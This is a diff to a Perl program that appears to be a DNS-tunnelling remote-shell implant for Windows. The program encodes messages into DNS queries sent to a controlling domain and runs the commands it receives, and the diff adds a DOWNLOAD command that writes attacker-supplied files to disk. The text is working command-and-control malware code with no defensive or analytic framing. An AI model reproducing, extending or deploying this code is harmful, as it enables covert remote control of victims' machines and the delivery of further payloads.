@@ -38,7 +38,6 @@ if ($debug) {
 ###############################
 sub getNameServers {
 	use Win32::Registry;
-	#my $dns_via_dhcp;
 	$::HKEY_LOCAL_MACHINE->Open("SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters", my $key) or debug("READ DHCP DNS ERROR", $!);
 	my ($type, $value);
     $key->QueryValueEx("DHCPNameServer", $type, $value);
@@ -84,13 +83,11 @@ sub sendQuery{
 	debug("MSG_ENCODED LENGTH", length($msg_encoded));	
 	
 	my $parts = roundup(length($msg_encoded) / 63);
-	debug("NUM OF PARTS", $parts);
 	
 	my @chunks = ($msg_encoded =~ /.{1,63}/gs);
 	my $return;
 	for (my $part = 1; $part <= $parts; $part++) {
-		debug("PART: $part", "$chunks[$part-1] (" . length($chunks[$part-1]) . ")");
-	
+
 		my $query = "$chunks[$part-1].$part.$parts.$cmd.$client_id_encoded.$domain";
 		if ($debug) {
 			print "QUERY: $query (" . length($query) . ")\n";
@@ -118,6 +115,11 @@ sub shell{
 		my $exec_rsp = "NULL";
 		my $client_cmd = "NULL";
 		my $sleep_value = 60;
+		my $dsleep = 0;
+		my $dfile_name;
+		my $dfile_counter = 0;
+		my $dfile_content;
+		my $dfile_content_encoded;
         while(1) {
 				getNameServers();
 				debug("EXEC_RSP", $exec_rsp);
@@ -162,6 +164,35 @@ sub shell{
 						$exec_rsp = "COMMAND EXITED WITH: FAILURE\n";
 					}
 					$client_cmd = "CWD";
+				} elsif ($cmd eq "DOWNLOAD") {
+					if($payload =~ /FILENAME:(.*)/) {
+						$dfile_name = $1;
+						debug("DFILE_NAME", $dfile_name);
+						$exec_rsp = "DFILE_NAME:" . $dfile_name;
+						$client_cmd = "DOWNLOAD";
+						unlink $dfile_name;
+						$dsleep = $sleep_value;
+						$sleep_value = .5;
+					} elsif ($payload eq "DONE") {
+						$exec_rsp = "DONE";
+						$dfile_counter = 0;
+						$client_cmd = "DOWNLOAD";
+						debug("DFILE", "DONE");
+						$sleep_value = $dsleep;
+					} elsif ($payload =~ /CONTENT:(.*)/) {
+						$dfile_content_encoded = $1;
+						debug("DFILE_COUNTER", $dfile_counter);
+						
+						$dfile_content = MIME::Base32::decode($dfile_content_encoded);
+						open DFILE, ">>$dfile_name" or debug ("DFILE", $!);
+						binmode DFILE;
+						print DFILE $dfile_content;
+						close DFILE;
+
+						$dfile_counter++;
+						$exec_rsp = "CONTENT:" . $dfile_counter;
+						$client_cmd = "DOWNLOAD";
+					}
 				} elsif ($cmd eq "NULL") {
 					$exec_rsp = "NULL";
 					$client_cmd = "NULL";
